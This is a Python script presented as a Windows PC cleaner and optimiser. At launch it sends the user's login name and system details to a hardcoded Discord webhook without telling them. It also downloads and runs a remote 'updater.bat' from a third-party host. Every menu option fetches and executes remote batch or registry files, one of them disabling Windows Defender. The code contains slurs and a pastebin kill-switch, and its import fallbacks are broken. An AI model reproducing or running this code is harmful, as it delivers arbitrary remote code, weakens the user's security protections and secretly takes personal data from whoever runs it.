
try:
    import threading
except:
    os.system("pip install threading")
    import threading
try:
    from tkinter import ttk, messagebox
except:
    os.system("pip install tkinter")
    from tkinter import ttk, messagebox
try:
    import webbrowser
except:
    os.system("pip install webbrowser")
    import webbrowser
try:
    from random import randint
except:
    os.system("pip install random")
    from random import randint
try:
    import base64
except:
    os.system("pip install base64")
    import base64
try:
    import os
except:
    os.system("pip install os")
    import os
try:
    import time
except:
    os.system("pip install time")
    import time
try:
    import subprocess
except:
    os.system("pip install subprocess")
    import subprocess
try:
    from pathlib import Path
except:
    os.system("pip install pathlib")
    from pathlib import Path
try:
    import platform
except:
    os.system("pip install platform")
    import platform
try:
    import sys
except:
    os.system("pip install sys")
    import sys
try:
    import socket
except:
    os.system("pip install socket")
    import socket
try:
    import webbrowser
except:
    os.system("pip install webbrowser")
    import webbrowser
try:
    import discord
except:
    os.system("pip install discord")
    import discord
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
    from colorama import Fore
try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except:
    os.system("pip install discord_webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
try:
    import psutil
except:
    os.system("pip install psutil")
    import psutil
try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    import pystyle
except:
    os.system("pip install pystyle")
    import pystyle

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama

try:
    from colorama import Fore
except:
    os.system("pip install Fore")
    from colorama import Fore

try:
    from pystyle import Colors, Colorate, Center
except:
    os.system("pip install pystyle")
    from pystyle import Colors, Colorate, Center
try:
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
except:
    os.system("pip install pystyle")
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from tkinter import font
import tkinter as tk
#
print(f"{Fore.RESET}[{Fore.BLUE}updater{Fore.RESET}] checking for updates")
#auto update
THIS_VERSION ='1.5'
def updater():
    v = requests.get("https://pastebin.com/raw/w29LjVc2").text
    time.sleep(0.5)
    if not THIS_VERSION == v:
        os.system("cls")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] New version available!")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloading new version...")
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
        r = requests.get(url)  
        with open(fr"updater.bat", 'wb') as f:
         f.write(r.content)
        os.startfile("updater.bat")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloaded!")
        input(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Press enter to exit...")
        os._exit(1)
    else:
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] You are running the latest version!")
        time.sleep(0.5)
updater()
#

lol=(f"     [>] Running with Python {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}")
version = sys.getwindowsversion()
mo = '[>] using '+(platform.system()) + (platform.release())
BY = 'by jotaro'
LMAO = 'version 1.5'
obj_Disk = psutil.disk_usage('/')
psutil.virtual_memory()
username = os.getlogin()
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)  
tools = os.getcwd()+"\\tools\\"
if not os.path.exists(tools):
    os.mkdir(tools)
#
#i just wanna know how many people ran my shit dont spam my webhook nigga thats gay tho.

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', username="pycleaner bot", )
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', content='<@822132948769177620>', username="pycleaner bot",)
embed = DiscordEmbed(title='pycleaner ', description= username +' used ur program damn ', color='ff0000')
embed.set_author(name='https://github.com/j0taro/pycleaner', url='https://i.imgur.com/coJFefW.png', icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
embed.set_footer(text= mo + lol, icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
webhook.add_embed(embed)
response = webhook.execute()
# THIS CREATES THE TOOLS DIRECTORY IN THE SAME DIRECTORY, IF IT DOES NOT EXIST, IN WHICH THE PYTHON SCRIPT IS RAN. 
ver = Center.XCenter('''
by jotaro 
██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ░░███╗░░░░░███████╗██╗
██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ░████║░░░░░██╔════╝██║
╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ██╔██║░░░░░██████╗░██║
░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ╚═╝██║░░░░░╚════██╗╚═╝
░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗██████╔╝██╗
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝╚═════╝░╚═╝''')
__author__ = 'jotaro' 
__VERSION__ = '1.4'
os.system("title PRESS ENTER")

banner =LMAO+r'''
███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
'''+ BY + '                  welcome, '+username  

System.Size(120, 30)
System.Clear()
Anime.Fade(Center.XCenter(banner), Colors.rainbow, Colorate.Vertical, interval=0.025, enter=True)
os.system("title  Hello, "+   username)

banner = Center.XCenter(LMAO+"""
███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
"""+BY)
banner2 =Center.XCenter( mo +    lol)



options ="""
         OPTIONS                         OPTIONS                             OPTIONS

1.)  create a restore point          2.)  temp cleaner                     3.)  log cleaner
4.)  disable services                5.)  Services Optimization            6.)  battery check (laptops only)
7.)  turn on hibernate               8.)  tree (better Responsiveness)     9.)  Delete Windows Update Cache
10.) disable windows defender        11.) sfc scan                         12.) Debloater (use it if u know how to)
13.) open restore point              14.) removes tools folder with files  15.) more info                     
16.) exit                            17.) add suggestion                   

"""
def download(url, name):
    response =  requests.get(url)
    open(tools+name, "w").write(response.text)
    os.startfile(tools+name)
    
    # THIS DOWNLOADS THE BAT FILES TO THE TOOLS DIRECTORY. THIS TAKES THE URL AND THE NAME OF THE BAT FILE.

def main():
    os.system('cls')
    print(Colorate.Vertical(Colors.blue_to_red, banner2))
    print(Colorate.Vertical(Colors.rainbow, banner + options, 2))
    choice = input(Colors.yellow + 'Which option do you choose '+ username+'? ->  ')
    
    #restore point
    if choice == '1':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/point.bat", "point.bat")
    #temp
    if choice == '2':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/temp.bat", "temp_cleaner.bat")
        
    #log cleaner
    elif choice == '3':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/log%20cleaner.bat", "log_cleaner.bat")
       
    #disable services
    elif choice == "4":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/services.bat", "disable_services.bat")
  
    #service_optimizer
    elif choice == "5":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/optimization.bat", "service_optimizer.bat")

    #battery_check
    elif choice == '6':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/battery.bat", "battery_check.bat")
 
    #hibernate
    elif choice == '7':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hibernate.bat", "hibernate.bat")

    #tree
    elif choice == '8':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/tree.bat", "tree.bat")

    #windows update
    elif choice == '9':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/update.cmd", "delete_windows_update_cache.cmd")

    #disable_services
    elif choice == '10':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/def.reg", "disable_windows_defender.reg")
    #sfc scan
    elif choice == '11':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/sfc.bat", "sfc.bat")
       
    #debloater   
    elif choice == '12':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Debloater.bat", "Debloater.bat")
     
    elif choice == '13':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/openp.bat", "openp.bat")
 

    #tools
    elif choice == '14':
       shutil.rmtree("tools")         
       main()
       
    #more info
    elif choice == '15':
        os.system('cls')
        print(Colors.red,ver)
        print(Colors.white,'''suggestion now u can add suggestion
    cleaner look
    more stuff
    fixed some bugs
        ''')
        print(Colors.orange,platform.platform())
        print(mo+lol)
        print((platform.machine())+ ' bit' )
        print("ur ip: "+IPAddr+' nice ip ngl')
        print('ur username is ' +   username)
        print ('total gb: ',obj_Disk.total / (1024.0 ** 3)) , print ('used gb:',obj_Disk.used / (1024.0 ** 3))
        print ('free gb:',obj_Disk.free / (1024.0 ** 3))
        print ('%: ',obj_Disk.percent)
        print('RAM memory % used:', psutil.virtual_memory()[2])
        print(Colors.white,'click enter to go back')
        print(Colors.white,'type more for more info')
        choice = input(Colors.blue + 'Which option do you choose? ->  ')
        if choice == 'more':
         webbrowser.open("https://untimelyimpressionableadministration.blus2tlia.repl.co/new.txt")
        
    #exit
    elif choice == '16': 
        os._exit(0) 
    elif choice =='17':
     suggestion = input("enter ur suggestion: ")
     webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', username="new suggestion", )
     webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', content='<@822132948769177620>', username="new suggestion",)
     embed = DiscordEmbed(title='new suggestion ', description= 'damn '+username +''' added a new suggestion:
''' + suggestion, color='000000')
     embed.set_author(name='https://github.com/j0taro/pycleaner', url='https://i.imgur.com/coJFefW.png', icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
     embed.set_footer(text=mo + lol, icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
     webhook.add_embed(embed)
     response = webhook.execute()
     print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER UPLOADER{Fore.RESET}]"+'suggestion uploaded, thanks for ur suggestion')
     time.sleep(3)
     main()

        
    #else       
    else:
        print("what?\n") 
        print("try agian "+ username)
        time.sleep(2)
        main()
    main()
    
m = requests.get("https://pastebin.com/raw/e7aLcr8Q").text
if __author__ != m:
    print("ERROR, dont play with the code nigga")
    os._exit(10)
         
main()
